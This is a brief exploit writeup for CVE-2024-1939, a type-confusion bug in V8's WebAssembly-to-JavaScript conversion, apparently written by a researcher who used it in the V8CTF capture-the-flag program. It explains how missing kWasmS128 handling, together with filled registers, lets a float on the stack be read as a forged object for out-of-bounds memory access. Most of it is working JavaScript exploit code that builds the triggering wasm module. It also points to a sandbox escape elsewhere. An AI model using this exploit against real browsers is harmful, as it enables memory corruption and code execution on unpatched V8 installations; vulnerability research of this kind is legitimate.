# CVE-2024-1939

This is a short writeup for the CVE-2024-1939, which I used to claim V8CTF M122.

The root cause of this issue is the lack of support for kWasmS128 in wasm-to-js conversion. Specifically, wasmS128Const operations occurring in parameter stacks are ignored, leading to type confusion when an ExprRef is present in the parameters.

In details, this will cause an int/float to be directly converted to an object. So it is easy to construct a fake array with arb length which will give us the ability of oob read and write. There is still one obstacle to bypass: The wasmS128Const will only take place of float type params that stores in FPSlot and will not influence the tagged params which stores in GPSlot. The ways exists in StackSlot. The FP/GP Regs has size limits. After that the params will be stored in StackSlot with order. If we fill the regs and put a float number on StackSlot, the tagged param will be parsed from StackSlot and give us our faked object.

The final exp will not include the builder of this wasm moudle for simpilicity and speed, so i will attach it here.

```js
function get_corrupt(addr) {
    var buf = new ArrayBuffer(8);
    var u32 = new Uint32Array(buf);
    var f64 = new Float64Array(buf);
    var u8 = new Uint8Array(buf);
    u32[0] = addr;
    u32[1] = 0;
    const builder = new WasmModuleBuilder();
    const typeId = builder.addType(makeSig([kWasmS128, kWasmF64, kWasmF64, kWasmF64, kWasmF64, kWasmF64, kWasmF64, kWasmI64, kWasmI64, kWasmI64,kWasmI64,kWasmI64,kWasmI31Ref,kWasmFuncRef], []));
    const importId = builder.addImport('mod', 'foo', typeId);
    builder.addDeclarativeElementSegment([importId]);

    builder.addFunction('main', kSig_v_v)
        .addLocals(wasmRefType(kWasmI31Ref), 1)
        .addBody([
            ...wasmS128Const(0xdeadbeef, 0xdeadbeef),
            ...wasmF64Const(1.1),
            ...wasmF64Const(1.1),
            ...wasmF64Const(1.1),
            ...wasmF64Const(1.1),
            ...wasmF64Const(1.1),
            ...wasmF64Const(f64[0]),
            ...wasmI64Const(0xbbbbbbbb),
            ...wasmI64Const(0xbbbbbbbb),
            ...wasmI64Const(0xbbbbbbbb),
            ...wasmI64Const(0xbbbbbbbb),
            ...wasmI64Const(0xbbbbbbbb),
            
            ...wasmI32Const(0xaaaaaaaa),
            kGCPrefix, kExprRefI31, kExprLocalTee, 0,
            kExprRefFunc, importId,
            kExprRefFunc, importId,
            kExprCallRef, typeId,
        ]).exportFunc();
    const instance = builder.instantiate({ mod: { foo: ff } });
    let f = instance.exports.main
    f();
}
get_corrupt(addr);
```

A worker is utilized to stabilize the memory, as it has been observed that addresses remain relatively stable in worker threads.

For sandbox bypasses, see [V8-Sandbox-Escape-via-Regexp](https://github.com/rycbar77/V8-Sandbox-Escape-via-Regexp). The final exploit uses normal orw chains to write the flag through stderr.